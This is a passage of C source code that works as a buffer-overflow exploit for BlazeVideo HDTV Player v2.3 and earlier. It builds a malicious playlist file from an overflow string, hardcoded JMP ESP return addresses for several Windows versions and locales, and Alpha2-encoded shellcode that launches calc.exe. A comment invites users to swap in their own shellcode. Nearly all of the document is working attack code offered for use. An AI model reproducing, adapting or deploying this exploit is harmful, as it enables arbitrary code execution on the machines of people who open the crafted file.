*/




#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[])
{

    FILE *Exploit;


    /* Executes Calc.exe Alpha2 Shellcode Provided by Expanders
<expanders[at]gmail[dot]com> */
    unsigned char scode[] =
    "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
    
"YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM"
    
"5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp"
    
"LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip"
    "sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA";


    /* replace it with your own shellcode :) */


    int JMP, x;

    
printf("\n======================================================================\n");
    printf("BlazeVideo HDTV Player <= v2.3 M3U Buffer Overflow 
Exploit\n");
    printf("Discovered and Coded By: Greg Linares
<GLinares.code[at]gmail[dot]com>\n");
    printf("Usage: %s <output PLF file> <JMP>\n", argv[0]);
    printf("\n JMP Options\n");
    printf("1 = English Windows XP SP 2 User32.dll <JMP ESP 
0x77db41bc>\n");
    printf("2 = English Windows XP SP 1 User32.dll <JMP ESP 
0x77d718fc>\n");
    printf("3 = English Windows 2003 SP0 and SP1 User32.dll <JMP ESP
0x77d74adc>\n");
    printf("4 = English Windows 2000 SP 4 User32.dll  <JMP ESP 
0x77e3c256>\n");
    printf("5 = French Windows XP Pro SP2  <JMP ESP 0x77d8519f> \n");
    printf("6 = German/Italian/Dutch/Polish Windows XP SP2  <JMP ESP
0x77d873a0> \n");
    printf("7 = Spainish Windows XP Pro SP2 <JMP ESP 0x77d9932f> \n");
    printf("8 = French/Italian/German/Polish/Dutch Windows 2000 Pro SP4
<JMP ESP 0x77e04c29>\n");
    printf("9 = French/Italian/Chineese Windows 2000 Server SP4 <JMP ESP
0x77df4c29>\n");
    
printf("====================================================================\n\n\n");


    /* thanks metasploit and jerome for opcodes */

    if (argc < 2) {
        printf("Invalid Number Of Arguments\n");
        return 1;
    }


    Exploit = fopen(argv[1],"w");
   if ( !Exploit )
   {
       printf("\nCouldn't Open File!");
       return 1;
   }



    fputs("C:\\", Exploit);

    for (x=0;x<257;x++) {
        fputs("A", Exploit);
    }


    if (atoi(argv[2]) <= 0) {
        JMP = 1;
    } else if (atoi(argv[2]) > 4) {
        JMP = 1;
    } else {
        JMP = atoi(argv[2]);
    }
    switch(JMP) {
        case 1:
            printf("Using English Windows XP SP2 JMP...\n");
            fputs("\xbc\x41\xdb\x77", Exploit);
            break;
        case 2:
            printf("Using English Windows XP SP1 JMP...\n");
            fputs("\xfc\x18\xd7\x77", Exploit);
            break;
        case 3:
            printf("Using English Windows 2003 SP0 & SP1 JMP...\n");
            fputs("\xdc\x4a\xd7\x77", Exploit);
            break;
        case 4:
            printf("Using English Windows 2000 SP 4 JMP...\n");
            fputs("\x56\xc2\xe3\x77", Exploit);
            break;
        case 5:
            printf("Using French Windows XP SP 2 JMP...\n");
            fputs("\x9f\x51\xd8\x77", Exploit);
            break;
        case 6:
            printf("Using German/Italian/Dutch/Polish Windows XP SP 2 
JMP...\n");
            fputs("\xa0\x73\xd8\x77", Exploit);
            break;
        case 7:
            printf("Using Spainish Windows XP SP 2 JMP...\n");
            fputs("\x2f\x93\xd9\x77", Exploit);
            break;
        case 8:
            printf("Using French/Italian/German/Polish/Dutch Windows 
2000 Pro
SP 4 JMP...\n");
            fputs("\x29\x4c\xe0\x77", Exploit);
            break;
        case 9:
            printf("Using French/Italian/Chineese Windows 2000 Server SP 
4 JMP...\n");
            fputs("\x29\x4c\xdf\x77", Exploit);
            break;

    }

    for (x=0;x<16;x++) {
        fputs("\x58", Exploit);
    }
    fputs(scode, Exploit);
    fputs("\r\n", Exploit);


    printf("Exploit Succeeded...\n Output File: %s\n\n", argv[1]);


    printf("Exploit Coded by Greg Linares 
(GLinares.code[at]gmail[dot]com)\n");
    printf("Greetz to: Everyone at EEye, Metasploit Crew, Jerome Athias
and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n");
    fclose(Exploit);
    return 0;
} 